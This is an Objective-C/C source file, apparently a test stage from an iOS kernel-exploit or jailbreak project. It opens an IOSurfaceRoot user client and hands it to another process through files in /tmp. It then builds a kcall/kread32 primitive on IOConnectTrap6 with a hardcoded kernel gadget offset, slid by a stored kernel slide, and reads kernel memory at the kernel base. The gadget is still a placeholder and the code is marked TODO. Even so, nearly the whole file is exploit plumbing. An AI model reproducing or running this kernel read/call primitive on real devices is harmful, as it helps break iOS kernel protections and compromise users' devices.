#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <mach/mach.h>

#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_object_t;
kern_return_t IOObjectRelease(io_object_t object);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
CFMutableDictionaryRef IOServiceMatching(const char *name);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
kern_return_t IOConnectTrap6(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
extern const mach_port_t kIOMasterPortDefault;
#define IO_OBJECT_NULL 0

uint32_t _user_client = 0;
uint64_t _kslide = 0;

uint64_t off_kread_gadget = 0xFFFFFFF005ABBF58;

uint32_t get_user_client() {
    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        printf("[-] Failed to get IOSurfaceRoot service");
        return -1;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to open IOSurfaceRoot service");
        return -1;
    }
    _user_client = conn;
    IOObjectRelease(service);

    return _user_client;
}

void save_uint32t_to_file(uint32_t value, const char *filePath) {
    FILE *file = fopen(filePath, "w");
    if (file == NULL) {
        printf("[-] Error opening file for writing");
        return;
    }
    
    fprintf(file, "0x%x", value);
    
    printf("[+] saved 0x%x to %s\n", value, filePath);
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
//    return IOConnectTrap6(_user_client, 0, x0, x1, x2, x3, x4, addr);
    return IOConnectTrap6(_user_client, (uint64_t)x0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), addr);
}

uint32_t kread32(uint64_t addr) {
    uint64_t kread_gadget = 0x4141414141414141;//off_kread_gadget + _kslide;
    
    return (uint32_t)kcall(kread_gadget, addr, 0, 0, 0, 0, 0);
}

int main(int argc, char **argv, char **envp){
	printf("[test-kernrw] Hello World! TODO: Get kernel r/w\n");
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:@"/tmp/kfund.plist"];
    _kslide = [dict[@"kslide"] unsignedLongLongValue];
    printf("kslide: 0x%llx\n", _kslide);
    
    remove("/tmp/test_kernrw_user_client.plist");
    remove("/tmp/test_kernrw_handoff_done.plist");
    
    uint32_t user_client = get_user_client();
    printf("[+] Got user client: 0x%x", _user_client);
    
    //save user_client to /tmp/test_kernrw_user_client.plist
    NSDictionary *dictionary = @{
        @"test_kernrw_user_client": @(user_client),
    };
    BOOL success = [dictionary writeToFile:@"/tmp/test_kernrw_user_client.plist" atomically:YES];
    printf("wrote uc ret: %d\n", success);
    
    while(1) {
        if(access("/tmp/test_kernrw_handoff_done.txt", F_OK) == 0)
            break;
    }
    usleep(10000);
    printf("kernbase kread32 test: 0x%x\n", kread32(0xfffffff007004000 + _kslide));

	printf("[test-kernrw] done\n");
    IOServiceClose(_user_client);
    _user_client = 0;
	return 0;
}
